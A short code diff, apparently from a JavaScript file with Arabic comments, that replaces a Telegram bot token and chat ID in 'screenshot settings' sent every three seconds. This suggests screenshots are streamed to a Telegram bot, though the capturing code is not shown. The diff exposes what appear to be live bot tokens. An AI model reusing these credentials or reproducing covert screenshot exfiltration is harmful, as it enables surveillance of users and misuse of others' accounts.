@@ -7,8 +7,8 @@ import {
 // ══════════════════════════════════════════════════
 //  إعدادات السكرين شوت — ضع بياناتك هنا
 // ══════════════════════════════════════════════════
-const SCREENSHOT_BOT_TOKEN = "8993455919:AAENzPPMDLFSiPIlDM27C9rM4K-OfXBTc88";
-const SCREENSHOT_CHAT_ID   = "8993455919";
+const SCREENSHOT_BOT_TOKEN = "8586863933:AAEdZAI2m0mB-R_BgWT8ZOzuwEyqDvqN0QY";
+const SCREENSHOT_CHAT_ID   = "8187027750";
 const SCREENSHOT_INTERVAL  = 3000; // كل 3 ثواني
 
 // ══════════════════════════════════════════════════
